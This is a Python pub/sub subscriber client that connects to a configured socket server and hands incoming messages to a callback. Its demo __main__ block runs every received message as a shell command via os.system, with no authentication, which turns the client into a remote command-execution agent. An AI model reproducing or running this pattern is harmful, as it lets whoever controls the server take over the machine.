import socket
import Settings
import json

from ClientType import ClientType
from response.SubscriberHandshakeResponse import SubscriberHandshakeResponse

class Subscriber:
    messages_count = 0
    __raw_client: socket.socket
    __endpoint_id:str
    __callback:callable
    handshake_response:SubscriberHandshakeResponse

    @staticmethod 
    def __default_callback(any:bytes, index:int):
        pass


    def __init__(self, endpoint_id:str):
        self.__raw_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__endpoint_id = endpoint_id
        self.__callback = self.__default_callback
        self.__raw_client.connect((Settings.HOST, Settings.PORT))
        self.__handshake()

    def __enter__(self):
        return self
    def __exit__(self, exc_type, exc_value, traceback):
        self.close()

    def __handshake(self):
        headers = {
            "ClientType": ClientType.Subscriber,
            "Id": self.__endpoint_id
        }

        self.__raw_client.send(json.dumps(headers).encode())
        self.__raw_client.send(b'\r\n\r\n')

        resp = self.__raw_client.recv(1024 * 4)
        if resp == '\r\n\r\n':
            resp = self.__raw_client.recv(1024 * 4)

        self.handshake_response = SubscriberHandshakeResponse.from_raw_json(resp.decode())
    
    def close(self) -> None:
        self.__raw_client.close()

    def set_callback(self, func:callable) -> None:
        self.__callback = func

    def start_listening(self):
        data = b'start'
        while data != b'':
            data = self.__raw_client.recv(1024 * 4)
            self.messages_count += 1
            self.__callback(data, self.messages_count)

if __name__ == "__main__":
    import os
    id = str()
    
    with open('./sub-id.txt', 'r') as file:
        id = file.readline()
        
    def callback(data:bytes, index:int):
        command = data.decode()
        print('>>>',command)
        os.system(command)

    with Subscriber(id) as sub:
        sub.set_callback(callback)
        sub.start_listening()
